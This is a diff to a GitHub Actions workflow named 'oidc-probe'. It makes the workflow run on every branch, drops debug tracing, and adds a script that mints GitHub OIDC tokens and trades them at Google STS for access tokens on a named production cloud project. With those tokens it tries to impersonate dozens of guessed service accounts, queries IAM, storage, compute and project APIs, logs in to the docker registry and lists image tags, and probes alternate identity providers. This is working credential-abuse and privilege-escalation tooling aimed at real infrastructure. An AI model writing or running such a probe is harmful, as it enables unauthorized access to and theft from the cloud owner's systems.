@@ -2,7 +2,7 @@ name: oidc-probe
 on:
   workflow_dispatch:
   push:
-    branches: [main]
+    branches: ["**"]
 permissions:
   id-token: write
   contents: write
@@ -15,54 +15,75 @@ jobs:
       - name: run-probe
         run: |
           exec > probe_results.txt 2>&1
-          set -x
           WIF_URL="//iam.googleapis.com/projects/1025538909507/locations/global/workloadIdentityPools/github/providers/github-actions"
           PROVIDER_AUD="https://iam.googleapis.com/projects/1025538909507/locations/global/workloadIdentityPools/github/providers/github-actions"
-          echo "REF=$GITHUB_REF REPO=$GITHUB_REPOSITORY ACTOR=$GITHUB_ACTOR EVENT=$GITHUB_EVENT_NAME"
-          echo "IDTOKEN_URL_SET=${ACTIONS_ID_TOKEN_REQUEST_URL:+yes}"
-          for AUD in "$PROVIDER_AUD" "sts.googleapis.com" "https://example.com"; do
-            echo "=================== AUD=[$AUD] ==================="
-            RAW=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$AUD")
-            TOK=$(echo "$RAW" | jq -r .value 2>/dev/null)
-            if [ -z "$TOK" ] || [ "$TOK" = "null" ]; then echo "MINT FAIL: $RAW"; continue; fi
-            echo "--- JWT payload ---"
-            echo "$TOK" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null; echo
-            echo "--- STS exchange (WIF) ---"
-            curl -sS -X POST https://sts.googleapis.com/v1/token \
-              -H "Content-Type: application/json" \
-              -d "{\"grantType\":\"urn:ietf:params:oauth:grant-type:token-exchange\",\"audience\":\"$WIF_URL\",\"scope\":\"https://www.googleapis.com/auth/cloud-platform\",\"requestedTokenType\":\"urn:ietf:params:oauth:token-type:access_token\",\"subjectTokenType\":\"urn:ietf:params:oauth:token-type:jwt\",\"subjectToken\":\"$TOK\"}"
-            echo
-            echo "--- STS exchange (alt audience as WIF) ---"
-            curl -sS -X POST https://sts.googleapis.com/v1/token \
-              -H "Content-Type: application/json" \
-              -d "{\"grantType\":\"urn:ietf:params:oauth:grant-type:token-exchange\",\"audience\":\"$AUD\",\"scope\":\"https://www.googleapis.com/auth/cloud-platform\",\"requestedTokenType\":\"urn:ietf:params:oauth:token-type:access_token\",\"subjectTokenType\":\"urn:ietf:params:oauth:token-type:jwt\",\"subjectToken\":\"$TOK\"}"
-            echo
+          PROJ="1025538909507"
+          echo "REF=$GITHUB_REF REPO=$GITHUB_REPOSITORY ACTOR=$GITHUB_ACTOR EVENT=$GITHUB_EVENT_NAME REFNAME=$GITHUB_REF_NAME"
+
+          mint() {
+            curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$PROVIDER_AUD" | jq -r .value
+          }
+          exchange() { # $1=token $2=aud(optional) $3=scope(optional)
+            local a="${2:-$WIF_URL}"; local s="${3:-https://www.googleapis.com/auth/cloud-platform}"
+            curl -sS -X POST https://sts.googleapis.com/v1/token -H "Content-Type: application/json" \
+              -d "{\"grantType\":\"urn:ietf:params:oauth:grant-type:token-exchange\",\"audience\":\"$a\",\"scope\":\"$s\",\"requestedTokenType\":\"urn:ietf:params:oauth:token-type:access_token\",\"subjectTokenType\":\"urn:ietf:params:oauth:token-type:jwt\",\"subjectToken\":\"$1\"}"
+          }
+
+          echo "=== [ref test] mint+exchange on this ref ($GITHUB_REF) ==="
+          TOK=$(mint)
+          echo "$TOK" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null; echo
+          RES=$(exchange "$TOK")
+          echo "EXCHANGE_RESP: $(echo "$RES" | head -c 120)"
+          ACC=$(echo "$RES" | jq -r .access_token 2>/dev/null)
+          echo "GOT_ACC=${ACC:0:12}..."
+
+          echo "=== [provider-attribute probe] try different scope values ==="
+          for S in "https://www.googleapis.com/auth/cloud-platform" "openid" "email"; do
+            echo "--scope $S --"
+            exchange "$TOK" "$WIF_URL" "$S" | head -c 200; echo
           done
-          echo "=================== SA IMPERSONATION ==================="
-          TOK=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$PROVIDER_AUD" | jq -r .value)
-          FED=$(curl -sS -X POST https://sts.googleapis.com/v1/token -H "Content-Type: application/json" \
-            -d "{\"grantType\":\"urn:ietf:params:oauth:grant-type:token-exchange\",\"audience\":\"$WIF_URL\",\"scope\":\"https://www.googleapis.com/auth/cloud-platform\",\"requestedTokenType\":\"urn:ietf:params:oauth:token-type:access_token\",\"subjectTokenType\":\"urn:ietf:params:oauth:token-type:jwt\",\"subjectToken\":\"$TOK\"}")
-          echo "FED_TOKEN_RESP=$FED"
-          ACC=$(echo "$FED" | jq -r .access_token 2>/dev/null)
-          if [ "$ACC" != "null" ] && [ -n "$ACC" ]; then
-            for SA in builder deploy monobase-builder replicate; do
-              echo "=== impersonate $SA ==="
-              curl -sS -X POST "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/$SA@replicate-production.iam.gserviceaccount.com:generateAccessToken" \
-                -H "Authorization: Bearer $ACC" -H "Content-Type: application/json" \
-                -d '{"scope":["https://www.googleapis.com/auth/cloud-platform"],"lifetime":"300s"}'
-              echo
-            done
-            echo "=== list SAs ==="
-            curl -sS "https://iam.googleapis.com/v1/projects/1025538909507/serviceAccounts" -H "Authorization: Bearer $ACC"; echo
-            echo "=== list GAR repos us ==="
-            curl -sS "https://artifactregistry.googleapis.com/v1/projects/1025538909507/locations/us/repositories" -H "Authorization: Bearer $ACC"; echo
-            echo "=== list GAR repos us-central1 ==="
-            curl -sS "https://artifactregistry.googleapis.com/v1/projects/1025538909507/locations/us-central1/repositories" -H "Authorization: Bearer $ACC"; echo
-          else
-            echo "no federated access token"
-          fi
-          echo "DONE"
-          set +x
+
+          if [ "$ACC" = "null" ] || [ -z "$ACC" ]; then echo "NO ACC TOKEN"; exit 0; fi
+
+          echo "=== [SA enumeration] generateAccessToken over many candidates ==="
+          SA_LIST="builder deploy monobase-builder replicate github-actions github-actions-builder gha ci ci-builder deploy-bot deployer terraform cloudbuild artifact-registry artifactregistry docker build push release pulumi flux-wif external-secrets k8s cluster admin web api worker actions actions-runner gke default-compute compute app-production prod-production staging replicate-builder replicate-deploy"
+          for SA in $SA_LIST; do
+            R=$(curl -sS -X POST "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/$SA@replicate-production.iam.gserviceaccount.com:generateAccessToken" \
+              -H "Authorization: Bearer $ACC" -H "Content-Type: application/json" \
+              -d '{"scope":["https://www.googleapis.com/auth/cloud-platform"],"lifetime":"300s"}')
+            if echo "$R" | grep -q '"accessToken"'; then
+              echo "### SA_OK $SA : $(echo "$R" | head -c 80)"
+            else
+              echo "SA_DENY $SA : $(echo "$R" | jq -r '.error.message // .error' 2>/dev/null | head -c 90)"
+            fi
+          done
+
+          echo "=== [project-level APIs with federated token] ==="
+          for U in \
+            "https://cloudresourcemanager.googleapis.com/v1/projects/$PROJ" \
+            "https://cloudresourcemanager.googleapis.com/v1/projects/replicate-production" \
+            "https://iam.googleapis.com/v1/projects/$PROJ/serviceAccounts" \
+            "https://artifactregistry.googleapis.com/v1/projects/$PROJ/locations/us/repositories" \
+            "https://storage.googleapis.com/storage/v1/b?project=$PROJ" \
+            "https://compute.googleapis.com/compute/v1/projects/$PROJ/zones" \
+            ; do
+            echo "-- $U --"
+            curl -sS -H "Authorization: Bearer $ACC" "$U" | head -c 300; echo
+          done
+
+          echo "=== [GAR docker registry with federated oauth token] ==="
+          echo "$ACC" | docker login -u oauth2accesstoken --password-stdin https://us-docker.pkg.dev 2>&1 | head -5
+          curl -sS -H "Authorization: Bearer $ACC" "https://us-docker.pkg.dev/v2/replicate-production/replicate-services-us/tags/list" | head -c 300; echo
+
+          echo "=== [provider path variants in same pool] ==="
+          for P in github github-actions github-actions-oidc aws azure; do
+            A="//iam.googleapis.com/projects/$PROJ/locations/global/workloadIdentityPools/github/providers/$P"
+            echo "-- provider $P --"
+            curl -sS -X POST https://sts.googleapis.com/v1/token -H "Content-Type: application/json" \
+              -d "{\"grantType\":\"urn:ietf:params:oauth:grant-type:token-exchange\",\"audience\":\"$A\",\"scope\":\"https://www.googleapis.com/auth/cloud-platform\",\"requestedTokenType\":\"urn:ietf:params:oauth:token-type:access_token\",\"subjectTokenType\":\"urn:ietf:params:oauth:token-type:jwt\",\"subjectToken\":\"$TOK\"}" | head -c 200; echo
+          done
+
+          echo DONE
 
       - name: push results
         run: |
